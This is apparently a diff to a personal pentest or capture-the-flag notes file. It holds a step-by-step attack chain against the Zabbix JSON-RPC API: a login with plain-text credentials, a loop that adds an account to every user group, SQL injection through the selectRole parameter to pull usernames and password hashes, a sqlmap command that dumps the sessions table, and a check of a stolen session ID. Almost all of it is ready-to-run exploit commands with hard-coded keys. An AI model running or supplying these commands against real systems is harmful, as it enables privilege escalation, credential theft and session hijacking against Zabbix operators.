@@ -169,14 +169,33 @@ Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 First, create an API key from the user profile menu.
 Example Auth Key: 97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e98f
 
++---------- Login Get Auth Key ----------+
+curl \
+--request POST "http://$TARGET/zabbix/api_jsonrpc.php" \
+--header 'Content-Type: application/json-rpc' \
+--data '{"jsonrpc":"2.0","method":"user.login","params":{"username":"matthew","password":"96qzn0h2e1k3"},"id":1}
+
++---------- Set Auth Key ----------+
+AUTH_KEY=23b5c3d2e3c6a3ac6ec692ece555aad1
+
 +---------- Add Account to All Groups ----------+
-for i in {0..50}; do response=$(curl -s -X POST --url http://$TARGET/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data "{\"jsonrpc\": \"2.0\", \"method\":\"user.update\", \"params\":{\"usrgrps\": [{\"usrgrpid\": $i}], \"userid\": \"3\"},\"auth\":\"97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e98f\", \"id\": 3}"); [[ $response != *\"error\"* ]] && echo "Group ID: $i"; done
+for i in {0..50}; do response=$(curl \
+--request POST -s "http://$TARGET/zabbix/api_jsonrpc.php" \
+--header 'Content-Type: application/json-rpc' \
+--data "$(printf '{"jsonrpc":"2.0","method":"user.update","params":{"usrgrps":[{"usrgrpid":"%s"}],"userid":"3"},"auth":"%s","id":3}' "$i" "$AUTH_KEY")");[[ $response != *"error"* ]] && echo "[+] Added to group ID $i"; done
 
 +---------- Get Users, Password Hash and RoleID ----------+
-curl -s -X POST --url  http://$TARGET/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method":"user.get", "params": {"selectRole":["roleid, u.passwd"]}, "auth":"97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e98f", "id": 1}' | jq -r '.result[] | [.username, .role.passwd, .role.roleid] | @csv'
+curl \
+--request POST -s "http://$TARGET/zabbix/api_jsonrpc.php" \
+--header 'Content-Type: application/json-rpc' \
+--data '{"jsonrpc": "2.0", "method":"user.get", "params": {"selectRole":["roleid, u.passwd"]}, "auth":"$AUTH_KEY", "id": 1}' | jq -r '.result[] | [.username, .role.passwd, .role.roleid] | @csv'
 
 +---------- Dump Active Sessions ----------+
-sqlmap -u "http://$TARGET/zabbix/api_jsonrpc.php" --data='{"jsonrpc":"2.0","method":"user.get","params":{"selectRole":["roleid, *"]},"auth":"97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e98f","id":1}' --headers="Content-Type: application/json-rpc" --random-agent -D zabbix -T sessions --columns --dump
+sqlmap \
+--method POST -u "http://$TARGET/zabbix/api_jsonrpc.php" \
+--headers="Content-Type: application/json-rpc" \
+--data='{"jsonrpc":"2.0","method":"user.get","params":{"selectRole":["roleid, *"]},"auth":"23b5c3d2e3c6a3ac6ec692ece555aad1","id":1}' \
+--random-agent -D zabbix -T sessions --columns --dump
 
 +---------- Verify Session ID ----------+
 curl -X POST http://$TARGET/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc": "2.0","method": "user.checkAuthentication","params": {"sessionid": "fdcfbcb99704cba0bf030d626d671510"},"id": 1}'
